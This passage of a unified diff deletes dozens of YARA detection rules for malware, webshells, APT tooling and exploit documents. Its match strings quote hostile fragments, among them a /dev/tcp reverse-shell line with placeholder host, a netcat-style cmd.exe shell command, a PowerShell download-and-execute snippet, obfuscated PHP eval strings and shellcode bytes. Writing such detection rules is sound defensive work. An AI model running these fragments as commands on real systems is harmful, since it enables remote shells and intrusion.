-		description = "Sethc.exe has been replaced - Indicates Remote Access Hack RDP"
-		author = "F. Roth"
-		reference = "http://www.emc.com/collateral/white-papers/h12756-wp-shell-crew.pdf"
-		date = "2014/01/23"
-		score = 70
-		id = "9dfbab4e-3dc8-5246-a051-1618f2ca5f39"
-	strings:
-		$s1 = "stickykeys" fullword nocase
-		$s2 = "stickykeys" wide nocase
-		$s3 = "Control_RunDLL access.cpl" wide fullword
-		$s4 = "SETHC.EXE" wide fullword
-	condition:
-		filename == "sethc.exe"
-      and uint16(0) == 0x5a4d
-      and not 1 of ($s*) and not WINDOWS_UPDATE_BDC
-}
-
-rule lsass_ANOMALY {
-	meta:
-		description = "Anomaly rule looking for certain strings in a system file (maybe false positive on certain systems) - file lsass.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "not set"
-		date = "2015/03/16"
-		hash = "04abf92ac7571a25606edfd49dca1041c41bef21"
-		id = "0c0f6129-3e01-56d3-b297-cee231567759"
-	strings:
-		$s1 = "LSA Shell" fullword wide
-		$s2 = "<description>Local Security Authority Process</description>" fullword ascii
-		$s3 = "Local Security Authority Process" fullword wide
-		$s4 = "LsapInitLsa" fullword
-	condition:
-		filename == "lsass.exe"
-      and uint16(0) == 0x5a4d
-      and not 1 of ($s*) and not WINDOWS_UPDATE_BDC
-}
-
-rule taskmgr_ANOMALY {
-   meta:
-      description = "Anomaly rule looking for certain strings in a system file (maybe false positive on certain systems) - file taskmgr.exe"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "not set"
-      date = "2015/03/16"
-      nodeepdive = 1
-      hash = "e8b4d84a28e5ea17272416ec45726964fdf25883"
-      id = "e1c3a150-6e7e-5ead-a338-0bac6f43185d"
-   strings:
-      $s0 = "Windows Task Manager" fullword wide
-      $s1 = "taskmgr.chm" fullword
-      $s2 = "TmEndTaskHandler::" ascii
-      $s3 = "CM_Request_Eject_PC" /* Win XP */
-      $s4 = "NTShell Taskman Startup Mutex" fullword wide
-   condition:
-      ( filename == "taskmgr.exe" or filename == "Taskmgr.exe" ) and not 1 of ($s*) and not WINDOWS_UPDATE_BDC
-      and uint16(0) == 0x5a4d
-      and filepath contains "C:\\"
-      and not filepath contains "Package_for_RollupFix"
-}
-
-rule APT_Cloaked_CERTUTIL {
-   meta:
-      description = "Detects a renamed certutil.exe utility that is often used to decode encoded payloads"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research"
-      date = "2018-09-14"
-      modified = "2022-06-27"
-      id = "13943cda-6bb1-5c6c-8e55-e8d4bba1ffef"
-   strings:
-      $s1 = "-------- CERT_CHAIN_CONTEXT --------" fullword ascii
-      $s5 = "certutil.pdb" fullword ascii
-      $s3 = "Password Token" fullword ascii
-   condition:
-      uint16(0) == 0x5a4d and all of them
-      and not filename contains "certutil"
-      and not filename contains "CertUtil"
-      and not filename contains "Certutil"
-      and not filepath contains "\\Bromium\\"
-}
-
 rule IronPanda_DNSTunClient {
 	meta:
 		description = "Iron Panda malware DnsTunClient - file named.exe"
@@ -26752,161 +24245,6 @@ rule MAL_WIN_Megazord_Apr25 {
         uint16(0) == 0x5a4d and
         $code_custom_algorithm and
         5 of ($megazord_str_*)
-}
-
-rule MAL_LNX_SSHDOOR_Triton {
-   meta:
-      description = "Signature detecting "
-      author = "Marc-Etienne M.Leveille, modified by Florian Roth"
-      email  = "leveille@eset.com"
-      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/12/ESET-The_Dark_Side_of_the_ForSSHe.pdf"
-      date = "2018-12-05"
-      license = "BSD 2-Clause"
-      id = "51ec2e60-d84a-5271-a7fe-e12d597be00c"
-   strings:
-      /* SSH binaries - specific strings */
-      $a_usage1 = "usage: ssh ["
-      $a_usage2 = "usage: %s [options] [command [arg ...]]"
-      $a_old_version1 = "-L listen-port:host:port"
-      $a_old_version2 = "Listen on the specified port (default: 22)"
-      $a_usage = "usage: %s [-46Hv] [-f file] [-p port] [-T timeout] [-t type]"
-      /* SSH binaries - combo required */
-      $ac_usage = "usage: %s [options] [file ...]\n"
-      $ac_log1 = "Could not open a connection to your authentication agent.\n"
-      $ac_pass2 = "Enter your OpenSSH passphrase:"
-      $ac_log2 = "Could not grab %s. A malicious client may be eavesdropping on you"
-      $ac_pass3 = "Enter new passphrase (empty for no passphrase):"
-      $ac_log3 = "revoking certificates by key ID requires specification of a CA key"
-
-      /* Strings from malicious files */
-      /* abafar */
-      $s_log_c =  "%s:%s@%s"
-      $s_log_d =  "%s:%s from %s"
-      /* akiva */
-      $s_log_aki = /(To|From):\s(%s\s\-\s)?%s:%s\n/
-      /* alderaan */
-      $s_log_ald = /login\s(in|at):\s(%s\s)?%s:%s\n/
-      /* ando */
-      $ando_s1 = "%s:%s\n"
-      $ando_s2 = "HISTFILE"
-      $ando_i = "fopen64"
-      $ando_m1 = "cat "
-      $ando_m2 = "mail -s"
-      /* anoat */
-      $s_log_ano = "%s at: %s | user: %s, pass: %s\n"
-      /* batuu */
-      $s_args_bat = "ssh: ~(av[%d]: %s\n)"
-      $s_log_bat = "readpass: %s\n"
-      /* banodan */
-      $s_banodan1 = "g_server"
-      $s_banodan2 = "mine.sock"
-      $s_banodan3 = "tspeed"
-      $s_banodan4 = "6106#x=%d#%s#%s#speed=%s"
-      $s_banodan5 = "usmars.mynetgear.com"
-      $s_banodan6 = "user=%s#os=%s#eip=%s#cpu=%s#mem=%s"
-      /* borleias */
-      $s_borleias_log = "%Y-%m-%d %H:%M:%S [%s]"
-      /* ondaron */
-      $s_daemon = "user:password --> %s:%s\n"
-      $s_client = /user(,|:)(a,)?password@host \-\-> %s(,|:)(b,)?%s@%s\n/
-      /* polis_massa */
-      $s_polis_log = /\b\w+(:|\s-+>)\s%s(:%d)?\s\t(\w+)?:\s%s\s\t(\w+)?:\s%s/
-      /* quarren */
-      $s_quarren_log = "h: %s, u: %s, p: %s\n"
-
-      /* chandrilla */
-      $chandrila_log = "S%s %s:%s"
-      $chandrila_magic = { 05 71 92 7D }
-
-      /* atollon */
-      // single byte offset from base pointer
-      $atollon_bp = /(\xC6\x45.{2}){25}/
-      // dword ss with single byte offset from base pointer
-      $atollon_bp_dw = /(\xC7\x45.{5}){20}/
-      // 4-bytes offset from base pointer
-      $atollon_bp_off = /(\xC6\x85.{5}){25}/
-      // single byte offset from stack pointer
-      $atollon_sp = /(\xC6\x44\x24.{2}){25}/
-      // 4-bytes offset from stack pointer
-      $atollon_sp_off = /(\xC6\x84\x24.{5}){25}/
-      /* other strings */
-      $atollon_f1 = "PEM_read_RSA_PUBKEY"
-      $atollon_f2 = "RAND_add"
-      $atollon_log = "%s:%s"
-      $atollon_rand = "/dev/urandom"
-
-      /* bespin */
-      $bespin_log1 = "%Y-%m-%d %H:%M:%S"
-      $bespin_log2 = "%s %s%s"
-      $bespin_log3 = "[%s]"
-
-      /* coruscant */
-      $coruscant_s1 = "%s:%s@%s\n"
-      $coruscant_s2 = "POST"
-      $coruscant_s3 = "HTTP/1.1"
-
-      /* crait */
-      $crait_i1 = "flock"
-      $crait_i2 = "fchmod"
-      $crait_i3 = "sendto"
-
-      /* jakuu */
-      $jakuu_dec = /GET\s\/\?(s|c)id=/
-      $jakuu_enc1 = "getifaddrs"
-      $jakuu_enc2 = "usleep"
-      $jakuu_ns = "gethostbyname"
-      $jakuu_log = "%s:%s"
-      $jakuu_rc4 = { A1 71 31 17 11 1A 22 27 55 00 66 A3 10 FE C2 10 22 32 6E 95 90 84 F9 11 73 62 95 5F 4D 3B DB DC }
-
-      /* kamino */
-      $kamino_s1 = "/var/log/wtmp"
-      $kamino_s2 = "/var/log/secure"
-      $kamino_s3 = "/var/log/auth.log"
-      $kamino_s4 = "/var/log/messages"
-      $kamino_s5 = "/var/log/audit/audit.log"
-      $kamino_s6 = "/var/log/httpd-access.log"
-      $kamino_s7 = "/var/log/httpd-error.log"
-      $kamino_s8 = "/var/log/xferlog"
-      $kamino_i1 = "BIO_f_base64"
-      $kamino_i2 = "PEM_read_bio_RSA_PUBKEY"
-      $kamino_i3 = "srand"
-      $kamino_i4 = "gethostbyname"
-
-      /* kessel */
-      $kessel_rc4 = "Xee5chu1Ohshasheed1u"
-      $kessel_s1 = "ssh:%s:%s:%s:%s"
-      $kessel_s2 = "sshkey:%s:%s:%s:%s:%s"
-      $kessel_s3 = "sshd:%s:%s"
-      $kessel_i1 = "spy_report"
-      $kessel_i2 = "protoShellCMD"
-      $kessel_i3 = "protoUploadFile"
-      $kessel_i4 = "protoSendReport"
-      $kessel_i5 = "tunRecvDNS"
-      $kessel_i6 = "tunPackMSG"
-
-      /* mimban */
-      $mimban_s1 = "<|||%s|||%s|||%d|||>"
-      $mimban_s2 = />\|\|\|%s\|\|\|%s\|\|\|\d\|\|\|%s\|\|\|%s\|\|\|%s\|\|\|%s\|\|\|</
-      $mimban_s3 = "-----BEGIN PUBLIC KEY-----"
-      $mimban_i1 = "BIO_f_base64"
-      $mimban_i2 = "PEM_read_bio_RSA_PUBKEY"
-      $mimban_i3 = "gethostbyname"
-   condition:
-      uint32be(0) == 0x7f454c46 and // ELF
-      ( 1 of ($a_*) or 2 of ($ac_*) ) // SSH Binary
-      and (
-         ( 1 of ($s*) ) or
-         ( all of ($ando_s*) and ($ando_i or all of ($ando_m*)) ) or
-         ( all of ($atollon*) ) or
-         ( all of ($bespin*) ) or
-         ( all of ($chandrila*) ) or
-         ( all of ($coruscant*) ) or
-         ( 2 of ($crait*) ) or
-         ( $jakuu_log and $jakuu_ns and ($jakuu_dec or all of ($jakuu_enc*) or $jakuu_rc4)) or
-         ( 5 of ($kamino_s*) and 3 of ($kamino_i*) ) or
-         ( 2 of ($kessel_s*) or 2 of ($kessel_i*) or $kessel_rc4 ) or
-         ( 2 of ($mimban_s*) and 2 of ($mimban_i*) )
-      )
 }
 
 rule apt_nix_elf_derusbi {
@@ -27415,26 +24753,6 @@ rule WoolenGoldfish_Generic_1 {
 		( 6 of ($s*) )
 }
 
-rule EXT_NK_GOLDBACKDOOR_inital_shellcode {
-    meta:
-        author= "Silas Cutler (silas@Stairwell.com)"
-        description = "Detection for initial shellcode loader used to deploy GOLDBACDOOR"
-        version = "0.1"
-        date = "2022-04-21"
-        reference = "https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
-        score = 80
-        id = "daab8e54-11b3-51cc-8bee-55b078f3e791"
-    strings:
-        $ = { C7 45 C4 25 6C 6F 63 50 8D 45 C4 C7 45 C8 61 6C 61 70 8B F9 C7 45
-              CC 70 64 61 74 50 B9 BD 88 17 75 C7 45 D0 61 25 5C 6C 8B DA C7 45 D4 6F
-              67 5F 67 C7 45 D8 6F 6C 64 2E C7 45 DC 74 78 74 00 }
-        // Import loaders
-        $ = { 51 50 57 56 B9 E6 8E 85 35 E8 ?? ?? ?? ?? FF D0 }
-        $ = { 6A 40 68 00 10 00 00 52 6A 00 FF 75 E0 B9 E3 18 90 72 E8 ?? ?? ?? ?? FF D0}
-    condition:
-        all of them
-}
-
 rule EXT_NK_GOLDBACKDOOR_injected_shellcode {
     meta:
         author= "Silas Cutler (silas@Stairwell.com)"
@@ -27455,142 +24773,6 @@ rule EXT_NK_GOLDBACKDOOR_injected_shellcode {
          $ = { B9 8E 8A DD 8D 8B F0 E8 E9 FB FF FF FF D0 }
     condition:
        3 of them
-}
-
-rule EXT_NK_GOLDBACKDOOR_generic_shellcode {
-    meta:
-        author= "Silas Cutler (silas@Stairwell.com)"
-        description = "Generic detection for shellcode used to drop GOLDBACKDOOR"
-        version = "0.1"
-        date = "2022-04-21"
-        reference = "https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
-        score = 75
-        id = "70081d63-0b26-5358-8444-5adc3a44aaa0"
-    strings:
-        $ = { B9 8E 8A DD 8D 8B F0 E8 ?? ?? ?? ?? FF D0 }
-        $ = { B9 8E AB 6F 40 [1-10] 50 [1-10] E8 ?? ?? ?? ?? FF D0 }
-    condition:
-        all of them
-}
-
-rule webshell_php_by_string_obfuscation : FILE {
-	meta:
-		description = "PHP file containing obfuscation strings. Might be legitimate code obfuscated for whatever reasons, a webshell or can be used to insert malicious Javascript for credit card skimming"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Arnim Rupp"
-		date = "2021/01/09"
-		modified = "2022-10-25"
-		hash = "e4a15637c90e8eabcbdc748366ae55996dbec926382220c423e754bd819d22bc"
-		id = "be890bf6-de7e-588e-b5cd-72e8081d0b9c"
-	strings:
-		$opbs13 = "{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}" wide ascii
-		$opbs14 = "/*-/*-*/\"" wide ascii
-		$opbs16 = "'ev'.'al'" wide ascii
-		$opbs17 = "'e'.'val'" wide ascii
-		$opbs18 = "e'.'v'.'a'.'l" wide ascii
-		$opbs19 = "bas'.'e6'." wide ascii
-		$opbs20 = "ba'.'se6'." wide ascii
-		$opbs21 = "as'.'e'.'6'" wide ascii
-		$opbs22 = "gz'.'inf'." wide ascii
-		$opbs23 = "gz'.'un'.'c" wide ascii
-		$opbs24 = "e'.'co'.'d" wide ascii
-		$opbs25 = "cr\".\"eat" wide ascii
-		$opbs26 = "un\".\"ct" wide ascii
-		$opbs27 = "'c'.'h'.'r'" wide ascii
-		$opbs28 = "\"ht\".\"tp\".\":/\"" wide ascii
-		$opbs29 = "\"ht\".\"tp\".\"s:" wide ascii
-		$opbs31 = "'ev'.'al'" nocase wide ascii
-		$opbs32 = "eval/*" nocase wide ascii
-		$opbs33 = "eval(/*" nocase wide ascii
-		$opbs34 = "eval(\"/*" nocase wide ascii
-		$opbs36 = "assert/*" nocase wide ascii
-		$opbs37 = "assert(/*" nocase wide ascii
-		$opbs38 = "assert(\"/*" nocase wide ascii
-		$opbs40 = "'ass'.'ert'" nocase wide ascii
-		$opbs41 = "${'_'.$_}['_'](${'_'.$_}['__'])" wide ascii
-		$opbs44 = "'s'.'s'.'e'.'r'.'t'" nocase wide ascii
-		$opbs45 = "'P'.'O'.'S'.'T'" wide ascii
-		$opbs46 = "'G'.'E'.'T'" wide ascii
-		$opbs47 = "'R'.'E'.'Q'.'U'" wide ascii
-		$opbs48 = "se'.(32*2)" nocase
-		$opbs49 = "'s'.'t'.'r_'" nocase
-		$opbs50 = "'ro'.'t13'" nocase
-		$opbs51 = "c'.'od'.'e" nocase
-		$opbs53 = "e'. 128/2 .'_' .'d"
-        // move malicious code out of sight if line wrapping not enabled
-		$opbs54 = "<?php                                                                                                                                                                                " //here I end
-		$opbs55 = "=chr(99).chr(104).chr(114);$_"
-		$opbs56 = "\\x47LOBAL"
-		$opbs57 = "pay\".\"load"
-		$opbs58 = "bas'.'e64"
-		$opbs59 = "dec'.'ode"
-		$opbs60 = "fla'.'te"
-        // rot13 of eval($_POST
-		$opbs70 = "riny($_CBFG["
-		$opbs71 = "riny($_TRG["
-		$opbs72 = "riny($_ERDHRFG["
-		$opbs73 = "eval(str_rot13("
-		$opbs74 = "\"p\".\"r\".\"e\".\"g\""
-		$opbs75 = "$_'.'GET"
-		$opbs76 = "'ev'.'al("
-        // eval( in hex
-		$opbs77 = "\\x65\\x76\\x61\\x6c\\x28" wide ascii nocase
-
-		//strings from private rule capa_php_old_safe
-		$php_short = "<?" wide ascii
-		// prevent xml and asp from hitting with the short tag
-		$no_xml1 = "<?xml version" nocase wide ascii
-		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
-		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
-		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-		$no_pdf = "<?xpacket"
-
-		// of course the new tags should also match
-        // already matched by "<?"
-		$php_new1 = /<\?=[^?]/ wide ascii
-		$php_new2 = "<?php" nocase wide ascii
-		$php_new3 = "<script language=\"php" nocase wide ascii
-
-		$fp1 = "NanoSpell TinyMCE Spellchecker for PHP" ascii fullword
-	condition:
-		filesize < 500KB and (
-			(
-				(
-						$php_short in (0..100) or
-						$php_short in (filesize-1000..filesize)
-				)
-				and not any of ( $no_* )
-			)
-			or any of ( $php_new* )
-		)
-		and any of ( $opbs* )
-		and not 1 of ($fp*)
-      and not filepath contains "\\Cache\\" /* generic cache e.g. for Chrome: \User Data\Default\Cache\ */
-      and not filepath contains "\\User Data\\Default\\Extensions\\" // chrome extensions
-      and not filepath contains "\\cache2\\" // FF cache
-      and not filepath contains "\\Microsoft\\Windows\\INetCache\\IE\\" // old IE
-      and not filepath contains "/com.apple.Safari/WebKitCache/"
-      and not filepath contains "\\Edge\\User Data\\" // some uncommon Edge path
-}
-
-rule Methodology_Suspicious_Shortcut_LOLcommand
-{
-  meta:
-    author = "@itsreallynick (Nick Carr)"
-    reference = "https://twitter.com/ItsReallyNick/status/1176601500069576704"
-    description = "Detects possible shortcut usage for .URL persistence"
-    score = 50
-    date = "27.09.2019"
-    modified = "2021-02-14"
-    id = "061e7919-17f1-5774-ad7d-fc964dc9a947"
-  strings:
-    $file1 = /[\x0a\x0d](IconFile|(Base|)URL)\s*=[^\x0d]*(powershell|cmd|certutil|mshta|wscript|cscript|rundll32|wmic|regsvr32|msbuild)(\.exe|)[^\x0d]{2,50}\x0d/ nocase
-    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
-    $url_explicit = "[InternetShortcut]" nocase
-  condition:
-    any of ($url*) and any of ($file*)
-    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
-    and filesize < 30KB
 }
 
 rule MAL_WebMonitor_RAT {
@@ -27886,28 +25068,6 @@ rule Oilrig_IntelSecurityManager_macro {
       filesize < 300KB and 1 of ($one*) or 2 of ($two*)
 }
 
-rule Oilrig_IntelSecurityManager {
-   meta:
-      description = "Detects OilRig malware"
-      author = "Eyal Sela"
-      reference = "Internal Research"
-      date = "2018-01-19"
-      id = "4cccc0df-a225-5500-be55-f4ae346e066e"
-   strings:
-      $one1 = "srvResesponded" ascii wide fullword
-      $one2 = "InetlSecurityAssistManager" ascii wide fullword
-      $one3 = "srvCheckresponded" ascii wide fullword
-      $one4 = "IntelSecurityManager" ascii wide
-      $one5 = "msoffice365cdn.com" ascii wide
-      $one6 = "\\tmpCa.vbs" ascii wide
-      $one7 = "AAZFinish" ascii wide fullword
-      $one8 = "AAZUploaded" ascii wide fullword
-      $one9 = "ABZFinish" ascii wide fullword
-      $one10 = "\\tmpCa.vbs" ascii wide
-   condition:
-      filesize < 300KB and any of them
-}
-
 rule APT_APT34_PS_Malware_Apr19_1 {
    meta:
       description = "Detects APT34 PowerShell malware"
@@ -27988,33 +25148,6 @@ rule ZxShell_Related_Malware_CN_Group_Jul17_3 {
       $s2 = "RegQueryValueEx(Svchost\\netsvcs)" fullword ascii
    condition:
       ( uint16(0) == 0x5a4d and filesize < 600KB and all of them )
-}
-
-rule ZxShell_Jul17 {
-   meta:
-      description = "Detects a ZxShell - CN threat group"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://blogs.rsa.com/cat-phishing/"
-      date = "2017-07-08"
-      hash1 = "5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16"
-      id = "1b009b20-5a19-5cac-aaaf-ca61310eab9f"
-   strings:
-      $x1 = "zxplug -add" fullword ascii
-      $x2 = "getxxx c:\\xyz.dll" fullword ascii
-      $x3 = "downfile -d c:\\windows\\update.exe" fullword ascii
-      $x4 = "-fromurl http://x.x.x/x.dll" fullword ascii
-      $x5 = "ping 127.0.0.1 -n 7&cmd.exe /c net start %s" fullword ascii
-      $x6 = "ZXNC -e cmd.exe x.x.x.x" fullword ascii
-      $x7 = "(bind a cmdshell)" fullword ascii
-      $x8 = "ZXFtpServer 21 20 zx" fullword ascii
-      $x9 = "ZXHttpServer" fullword ascii
-      $x10 = "c:\\error.htm,.exe|c:\\a.exe,.zip|c:\\b.zip\"" fullword ascii
-      $x11 = "c:\\windows\\clipboardlog.txt" fullword ascii
-      $x12 = "AntiSniff -a wireshark.exe" fullword ascii
-      $x13 = "c:\\windows\\keylog.txt" fullword ascii
-   condition:
-      ( filesize < 10000KB and 1 of them ) or 3 of them
 }
 
 rule HKTL_EXPL_WIN_PS1_BadSuccessor_May25 {
@@ -28121,33 +25254,6 @@ rule malrtf_ole2link : exploit {
 		uint32be(0) == 0x7B5C7274
 		and all of ($rtf_olelink_*)
 		and any of ($rtf_payload_*)
-}
-
-rule Invoke_PSImage {
-   meta:
-      description = "Detects a command to execute PowerShell from String"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/peewpw/Invoke-PSImage"
-      date = "2017-12-16"
-      id = "6abf53cd-6465-555b-a7d4-f5a917073f01"
-   strings:
-      $ = "IEX([System.Text.Encoding]::ASCII.GetString(" ascii wide
-      $ = "System.Drawing.Bitmap((a Net.WebClient).OpenRead(" ascii wide
-
-      $ = { 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52
-            00 00 04 E4 00 00 03 A0 08 06 00 00 00 9D AF A9
-            E8 00 00 00 09 70 48 59 73 00 00 19 D6 00 00 19
-            D6 01 18 D1 CA ED 00 00 00 07 74 49 4D 45 07 E1
-            0C 0F 13 1E 36 89 C4 28 BF 00 00 00 07 74 45 58
-            74 41 75 74 68 6F 72 00 A9 AE CC 48 00 00 00 0C
-            74 45 58 74 44 65 73 63 72 69 70 74 69 6F 6E 00
-            13 09 21 23 00 00 00 0A 74 45 58 74 43 6F 70 79
-            72 69 67 68 74 00 AC 0F CC 3A 00 00 00 0E 74 45
-            58 74 43 72 65 61 74 69 6F 6E 20 74 69 6D 65 00
-            35 F7 0F }
-   condition:
-      filesize < 3000KB and 1 of them
 }
 
 rule Scarcruft_malware_Feb18_1 {
@@ -28327,34 +25433,6 @@ rule VULN_Linux_Sudoers_Commands {
 		any of ($command*)
 }
 
-rule Regin_APT_KernelDriver_Generic_C {
-	meta:
-		description = "Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2"
-		author = "@Malwrsignatures - included in APT Scanner THOR"
-		date = "23.11.14"
-		hash1 = "e0895336617e0b45b312383814ec6783556d7635"
-		hash2 = "732298fa025ed48179a3a2555b45be96f7079712"
-		id = "2006b3f0-abd1-5274-8b18-75368671e062"
-	strings:
-		$m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 }
-
-		$s0 = "KeGetCurrentIrql" fullword ascii
-		$s1 = "5.2.3790.0 (srv03_rtm.030324-2048)" fullword wide
-		$s2 = "usbclass" fullword wide
-
-		$x1 = "PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" ascii
-		$x2 = "Universal Serial Bus Class Driver" fullword wide
-		$x3 = "5.2.3790.0" fullword wide
-
-		$y1 = "LSA Shell" fullword wide
-		$y2 = "0Richw" fullword ascii
-	condition:
-		uint16(0) == 0x5a4d and
-		$m0 at 0 and all of ($s*) and
-		( all of ($x*) or all of ($y*) )
-		and filesize < 20KB
-}
-
 rule apt_regin_legspin {
 	meta:
 	    copyright = "Kaspersky Lab"
@@ -28523,25 +25601,6 @@ rule EXPL_MAL_MalDoc_OBFUSCT_MHTML_Sep21_1 {
       $s1 = "109;&#104;&#116;&#109;&#108;&#58;&#104;&#116;&#109;&#108" ascii wide
    condition:
       filesize < 25KB and all of them
-}
-
-rule EXPL_XML_Encoded_CVE_2021_40444 {
-   meta:
-      author = "James E.C, Proofpoint"
-      description = "Detects possible CVE-2021-40444 with no encoding, HTML/XML entity (and hex notation) encoding, or all 3"
-      reference = "https://twitter.com/sudosev/status/1439205606129377282"
-      date = "2021-09-18"
-      modified = "2021-09-19"
-      score = 70
-      hash = "13DE9F39B1AD232E704B5E0B5051800FCD844E9F661185ACE8287A23E9B3868E" // document.xml
-      hash = "84674ACFFBA5101C8AC518019A9AFE2A78A675EF3525A44DCEDDEED8A0092C69" // original .docx
-      id = "4bf9ec64-c662-5c8f-9e58-12a7412ef07d"
-   strings:
-      $h1 = "<?xml " ascii wide
-      $t_xml_r = /Target[\s]{0,20}=[\s]{0,20}\["']([Mm]|&#(109|77|x6d|x4d);)([Hh]|&#(104|72|x68|x48);)([Tt]|&#(116|84|x74|x54);)([Mm]|&#(109|77|x6d|x4d);)([Ll]|&#(108|76|x6c|x4c);)(:|&#58;|&#x3a)/
-      $t_mode_r = /TargetMode[\s]{0,20}=[\s]{0,20}\["']([Ee]|&#(x45|x65|69|101);)([Xx]|&#(x58|x78|88|120);)([Tt]|&#(x74|x54|84|116);)/
-   condition:
-      filesize < 500KB and $h1 and all of ($t_*)
 }
 
 rule SUSP_OBFUSC_Indiators_XML_OfficeDoc_Sep21_1 : Windows CVE {
@@ -28832,22 +25891,6 @@ rule JS_Suspicious_MSHTA_Bypass {
       2 of them
 }
 
-rule JavaScript_Run_Suspicious {
-   meta:
-      description = "Detects a suspicious Javascript Run command"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://twitter.com/craiu/status/900314063560998912"
-      score = 60
-      date = "2017-08-23"
-      id = "87f98ead-3052-5777-8877-574619173aaa"
-   strings:
-      $s1 = "w = new ActiveXObject(" ascii
-      $s2 = " w.Run(r);" fullword ascii
-   condition:
-      all of them
-}
-
 rule Certutil_Decode_OR_Download {
    meta:
       description = "Certutil Decode"
@@ -28914,25 +25957,6 @@ rule VBS_Obfuscated_Mal_Feb18_1  {
       $s3 = "&WSCRIPT.SCRIPTFULLNAME&CHR" fullword ascii
    condition:
       filesize < 600KB and ( 1 of ($x*) or 3 of them )
-}
-
-rule OilRig_Strings_Oct17 {
-   meta:
-      description = "Detects strings from OilRig malware and malicious scripts"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/"
-      date = "2017-10-18"
-      modified = "2022-12-21"
-      id = "edf7c7ca-0c58-5507-8d99-83078ff8947a"
-   strings:
-      $x1 = "%localappdata%\\srvHealth.exe" fullword wide ascii
-      $x2 = "%localappdata%\\srvBS.txt" fullword wide ascii
-      $x3 = "Agent Injector\\PolicyConverter\\Inner\\obj\\Release\\Inner.pdb" ascii
-      $x4 = "Agent Injector\\PolicyConverter\\Joiner\\obj\\Release\\Joiner.pdb" ascii
-      $s3 = ".LoadDll(\"Run\", arg, \"C:\\\\Windows\\\\" ascii
-   condition:
-      filesize < 800KB and 1 of them
 }
 
 rule OilRig_ISMAgent_Campaign_Samples1 {
@@ -29114,24 +26138,6 @@ rule FVEY_ShadowBroker_user_tool_ebbisland {
       1 of them
 }
 
-rule FVEY_ShadowBroker_user_tool_envisioncollision {
-   meta:
-      description = "Auto-generated rule - file user.tool.envisioncollision.COMMON"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-      date = "2016-12-17"
-      hash1 = "2f04f078a8f0fdfc864d3d2e37d123f55ecc1d5e401a87eccd0c3846770f9e02"
-      id = "a738e270-a3ea-5d38-8933-797d1bd9036a"
-   strings:
-      $x1 = "-i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>" fullword ascii
-      $x2 = "sh</dev/tcp/REDIR_IP/SHELL_PORT>&0" fullword ascii
-      $x3 = "-n ENVISIONCOLLISION" ascii
-      $x4 = "-UADMIN -PPASSWORD -i127.0.0.1 -Dipboard" fullword ascii
-   condition:
-      1 of them
-}
-
 rule Freeenki_Infostealer_Nov17 {
    meta:
       description = "Detects Freenki infostealer malware"
@@ -29308,34 +26314,6 @@ rule ms11080_withcmd {
 		uint16(0) == 0x5a4d and filesize < 300KB and 1 of them
 }
 
-rule SUSP_Known_Type_Cloaked_as_JPG {
-   meta:
-      description = "Detects a non-JPEG file type cloaked as .jpg"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research - replacement for Cloaked_as_JPG rule"
-      date = "2022-09-16"
-      score = 60
-      id = "728908a6-74cf-5bab-a23f-cd03ed209430"
-   condition:
-      ( extension == ".jpg" or extension == ".jpeg" ) and ( 
-         filetype == "EXE" or
-         filetype == "ELF" or
-         filetype == "MACH-O" or
-         filetype == "VBS" or
-         filetype == "PHP" or
-         filetype == "JSP" or
-         filetype == "Python" or
-         filetype == "LSASS Dump File" or
-         filetype == "ASP" or
-         filetype == "BATCH" or
-         filetype == "RTF" or
-         filetype == "MDMP" or
-
-         filetype contains "PowerShell" or
-         filetype contains "Base64"
-      )
-}
-
 rule SUSP_PiratedOffice_2007 {
    meta:
       description = "Detects an Office document that was created with a pirated version of MS Office 2007"
@@ -29480,658 +26458,6 @@ rule MAL_WIN_Akira_Apr25 {
         uint16(0) == 0x5a4d and
         all of ($code_*) and
         all of ($akira_str_*)
-}
-
-rule Hacktools_CN_445_cmd {
-   meta:
-      description = "Disclosed hacktool set - file cmd.bat"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
